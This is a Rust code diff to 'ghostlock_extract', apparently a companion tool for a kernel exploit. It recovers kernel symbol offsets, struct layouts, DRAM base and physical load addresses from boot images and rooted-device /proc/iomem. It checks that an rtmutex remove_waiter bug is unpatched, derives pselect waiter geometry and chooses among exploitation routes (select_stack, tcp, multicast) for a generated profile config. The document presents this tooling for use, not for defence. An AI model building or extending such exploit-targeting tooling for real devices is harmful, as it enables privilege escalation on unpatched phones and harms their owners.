@@ -14,6 +14,7 @@ use ghostlock_extract::derive::{
 };
 use ghostlock_extract::error::{ExtractError, Result};
 use ghostlock_extract::fdt::{recover_kernel_phys_load, recover_kernel_phys_load_from_uefi};
+use ghostlock_extract::iomem;
 use ghostlock_extract::kallsyms;
 use ghostlock_extract::kallsyms::Kallsyms;
 use ghostlock_extract::kallsyms_finder;
@@ -36,6 +37,10 @@ struct Cli {
     /// embedded kallsyms table is recovered from the kernel image
     #[arg(long)]
     kallsyms: Option<PathBuf>,
+    /// /proc/iomem text file (rooted device dump); when omitted a readable
+    /// /proc/iomem is used to derive kernel_phys_offset and kernel_phys_load
+    #[arg(long)]
+    iomem: Option<PathBuf>,
     /// optional XBL xbl_config.img; derive kernel physical load from its FDT
     #[arg(long)]
     xbl_config: Option<PathBuf>,
@@ -263,6 +268,37 @@ fn run(cli: &Cli) -> Result<i32> {
     let Some(base) = base else {
         return Err(ExtractError::new("_text/_head is not unique in kallsyms"));
     };
+
+    // DRAM base / linear-map offset, and (with the kallsyms delta) the kernel
+    // physical load, from /proc/iomem when available (rooted device or --iomem).
+    let mut kernel_phys_offset: Option<u64> = None;
+    let iomem_info = match iomem::load(cli.iomem.as_deref()) {
+        Ok(info) => info,
+        Err(err) => {
+            eprintln!("warning: {err}");
+            None
+        }
+    };
+    if let Some(info) = iomem_info {
+        kernel_phys_offset = info.dram_base;
+        if kernel_phys_load.is_none() {
+            if let (Some(kc), Some(text), Some(stext)) = (
+                info.kernel_code_start,
+                kallsyms::unique(&symbols, "_text"),
+                kallsyms::unique(&symbols, "_stext"),
+            ) {
+                let delta = stext.wrapping_sub(text) & 0xffff_ffff;
+                let derived = kc.wrapping_sub(delta) & 0xffff_ffff;
+                eprintln!(
+                    "info: iomem; kernel_phys_load=0x{derived:x} kernel_phys_offset=0x{:x}",
+                    kernel_phys_offset.unwrap_or(0)
+                );
+                kernel_phys_load = Some(derived);
+                phys_source = "iomem";
+            }
+        }
+    }
+
     let (rel_symbols, sorted_offsets) = relative_symbols(&symbols, base);
     // stop early when remove_waiter() is fixed; --analysis reports it instead.
     let primitive = ensure_rtmutex_43499_unpatched(&boot.kernel, &rel_symbols, &sorted_offsets);
@@ -360,6 +396,9 @@ fn run(cli: &Cli) -> Result<i32> {
     let mut symbol_offsets = resolve_symbols(&symbols, base);
 
     let mut derived: BTreeMap<String, u64> = BTreeMap::new();
+    // Infeasible pselect geometry only rules out the select_stack route; it is
+    // recorded here and re-checked after route selection instead of aborting.
+    let mut pselect_infeasible: Option<String> = None;
     if !cli.no_disasm {
         if let Some(btf) = &btf {
             match derive_pselect_layout(
@@ -398,8 +437,8 @@ fn run(cli: &Cli) -> Result<i32> {
                     derived.insert("pselect_waiter_shift_value".to_string(), shift as u64);
                 }
                 Err(ExtractError::Infeasible(message)) => {
-                    eprintln!("error: pselect route not feasible on this kernel: {message}");
-                    return Ok(3);
+                    eprintln!("warning: pselect route not feasible on this kernel: {message}");
+                    pselect_infeasible = Some(message);
                 }
                 Err(err) => {
                     eprintln!("warning: pselect_waiter_shift derivation failed: {err}");
@@ -432,6 +471,11 @@ fn run(cli: &Cli) -> Result<i32> {
         .copied()
         .map(|value| value as i64)
         .or_else(|| {
+            // An infeasible derivation means this image's layout does not exist;
+            // a family default would be wrong, so it is not substituted.
+            if pselect_infeasible.is_some() {
+                return None;
+            }
             let shift = report::pselect_waiter_shift_for(release.as_deref());
             if let Some(shift) = shift {
                 eprintln!(
@@ -531,13 +575,25 @@ fn run(cli: &Cli) -> Result<i32> {
         let route = match cli.route.as_deref() {
             Some(route) => Some(route.to_string()),
             None => {
-                let paths = analysis::probe_paths(&symbols);
+                let paths =
+                    analysis::probe_paths(&symbols, &boot.kernel, &rel_symbols, &sorted_offsets);
                 let pselect_derived = derived.contains_key("pselect_waiter_shift_value");
                 let (suggested, _, _) =
                     analysis::suggest_route(pselect_derived, &paths, release.as_deref());
                 suggested.map(str::to_string)
             }
         };
+        // select_stack is the only route that needs the derived pselect layout;
+        // reject it here, after selection, so tcp/multicast can still proceed.
+        if route
+            .as_deref()
+            .is_some_and(analysis::route_depends_on_pselect_layout)
+        {
+            if let Some(message) = &pselect_infeasible {
+                eprintln!("error: pselect route not feasible on this kernel: {message}");
+                return Ok(3);
+            }
+        }
         let mut geometry = route
             .as_deref()
             .map(|route| {
@@ -631,9 +687,9 @@ fn run(cli: &Cli) -> Result<i32> {
         report::render_conf(&report::ConfInputs {
             release: release_text,
             phys: kernel_phys_load,
-            /* DRAM base is not derivable from the image; leave it for the
-             * profile author / runtime iomem to fill. */
-            phys_offset: None,
+            /* DRAM base: from /proc/iomem when the extractor ran on a rooted
+             * device, otherwise left for the profile author to fill. */
+            phys_offset: kernel_phys_offset,
             symbols: &symbol_offsets,
             structs: &struct_offsets,
             route: route.as_deref(),
